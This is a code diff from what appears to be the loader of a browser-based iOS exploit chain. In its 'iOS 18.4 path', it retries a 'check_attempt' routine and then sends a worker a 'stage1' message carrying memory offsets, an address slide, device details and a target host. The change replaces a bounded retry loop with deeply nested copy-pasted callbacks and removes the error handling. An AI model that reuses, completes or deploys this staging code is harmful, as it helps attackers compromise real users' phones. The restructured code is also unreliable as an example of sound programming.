@@ -332,11 +332,78 @@ let workerBlobUrl = URL.createObjectURL(workerBlob);
             }
             else
             {
-                const MAX_CHECK_ATTEMPTS = 8;
-                print("Starting check_attempt (iOS 18.4 path), max=" + MAX_CHECK_ATTEMPTS);
-                var attempt = new check_attempt();
-                function postStage1() {
-                    worker.postMessage({
+                print("Starting check_attempt (iOS 18.4 path)");
+        var attempt = new check_attempt();
+        attempt.start().then((result) => {
+            if(!result)
+            {
+               // print("Retrying");
+                attempt.start().then((result) => {
+                    if(!result)
+                    {
+                        attempt.start().then((result) => {
+                            if(!result)
+                            {
+                                attempt.start().then((result) => {
+                                    if(!result)
+                                    {
+                                        attempt.start().then((result) => {
+                                            if(!result)
+                                               print("");
+                                            else
+                                            {
+                                                worker.postMessage({
+                                                type: 'stage1',
+                                                begin,
+                                                origin,
+                                                ios_version,
+                                                offsets,
+                                                slide,
+                                                chipset,
+                                                device_model,
+                                                desiredHost,
+                                                SERVER_LOG
+                                                });
+                                            }
+                                        });
+                                    }
+                                    else
+                                    {
+                                        worker.postMessage({
+                                        type: 'stage1',
+                                        begin,
+                                        origin,
+                                        ios_version,
+                                        offsets,
+                                        slide,
+                                        chipset,
+                                        device_model,
+                                        desiredHost,
+                                        SERVER_LOG
+                                        });
+                                    }
+                                });
+                            }
+                            else
+                            {
+                                worker.postMessage({
+                                type: 'stage1',
+                                begin,
+                                origin,
+                                ios_version,
+                                offsets,
+                                slide,
+                                chipset,
+                                device_model,
+                                desiredHost,
+                                SERVER_LOG
+                                });
+                            }
+                        });
+                    }
+                    else
+                            {
+                        worker.postMessage({
                         type: 'stage1',
                         begin,
                         origin,
@@ -347,28 +414,27 @@ let workerBlobUrl = URL.createObjectURL(workerBlob);
                         device_model,
                         desiredHost,
                         SERVER_LOG
-                    });
-                }
-                function tryCheckAttempt(attemptNum) {
-                    if (attemptNum > MAX_CHECK_ATTEMPTS) {
-                        print("check_attempt: all " + MAX_CHECK_ATTEMPTS + " attempts exhausted, giving up", true);
-                        return;
+                });
+                            }
+                        });
                     }
-                    print("check_attempt: attempt " + attemptNum + "/" + MAX_CHECK_ATTEMPTS);
-                    attempt.start().then((result) => {
-                        if (result) {
-                            print("check_attempt: success on attempt " + attemptNum + ", posting stage1");
-                            postStage1();
-                        } else {
-                            print("check_attempt: attempt " + attemptNum + " failed, retrying...");
-                            tryCheckAttempt(attemptNum + 1);
-                        }
-                    }).catch((err) => {
-                        print("check_attempt: attempt " + attemptNum + " threw: " + err + ", retrying...", true);
-                        tryCheckAttempt(attemptNum + 1);
-                    });
-                }
-                tryCheckAttempt(1);
+                    else
+                    {
+                        //WebViewComptability(attempt, iframe);
+            worker.postMessage({
+                type: 'stage1',
+                begin,
+                origin,
+                ios_version,
+                offsets,
+                slide,
+                chipset,
+                device_model,
+                desiredHost,
+                SERVER_LOG
+            });
+                    }
+        });
             }
         }
         catch(e)
